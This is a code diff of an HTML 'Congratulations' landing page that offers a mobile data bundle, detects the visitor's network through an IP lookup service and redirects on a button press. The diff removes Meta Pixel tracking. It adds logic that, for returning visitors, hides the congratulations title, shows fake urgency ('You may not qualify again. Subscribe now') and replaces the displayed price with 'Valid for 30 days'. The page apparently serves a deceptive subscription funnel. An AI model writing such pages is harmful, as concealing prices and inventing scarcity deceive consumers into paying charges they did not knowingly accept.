@@ -5,24 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Congratulation</title>
 
-  <!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1622898892221727');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
-
 <script src="https://cdn.tailwindcss.com"></script>
 
 <style>
@@ -49,7 +31,6 @@ src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
 
 <body class="min-h-screen flex items-center justify-center px-4">
 
-<!-- SUBTLE DIM BACKGROUND -->
 <div class="fixed inset-0 bg-black/10 pointer-events-none"></div>
 
 <!-- PROCESSING -->
@@ -63,9 +44,10 @@ src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
   </p>
 </div>
 
-<!-- CONGRATULATIONS -->
+<!-- CONGRATS BOX -->
 <div id="congratsBox" class="relative z-10 hidden soft-card rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
-  <h1 class="text-2xl font-extrabold text-green-600 mb-2">
+  
+  <h1 id="titleText" class="text-2xl font-extrabold text-green-600 mb-2">
     🎉 Congratulations!
   </h1>
 
@@ -113,7 +95,7 @@ src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
   }, 5000);
 </script>
 
-<!-- NETWORK DETECTION -->
+<!-- BUTTON + REDIRECT -->
 <script>
 function detectNetwork() {
   fetch("https://ipinfo.io/json?token=55355b912bdc12")
@@ -155,7 +137,7 @@ document.addEventListener("DOMContentLoaded", function() {
 });
 </script>
 
-<!-- MESSAGE ROTATION (ONLY ADDITION) -->
+<!-- RETURN VISIT MODIFICATION -->
 <script>
   let visited = localStorage.getItem("visited");
 
@@ -163,11 +145,28 @@ document.addEventListener("DOMContentLoaded", function() {
     localStorage.setItem("visited", "true");
   } else {
     document.addEventListener("DOMContentLoaded", function () {
+
+      // Change message
       const msg = document.getElementById("offerMessage");
       if (msg) {
         msg.innerText =
           "⚠️ You may not qualify again. Subscribe now to receive your data bundle.";
       }
+
+      // Remove "Congratulations"
+      const title = document.getElementById("titleText");
+      if (title) {
+        title.style.display = "none";
+      }
+
+      // Change price to validity
+      const priceBox = document.getElementById("priceText");
+      if (priceBox) {
+        priceBox.innerText = "Valid for 30 days";
+        priceBox.classList.remove("bg-green-100", "text-green-700");
+        priceBox.classList.add("bg-blue-100", "text-blue-700");
+      }
+
     });
   }
 </script>
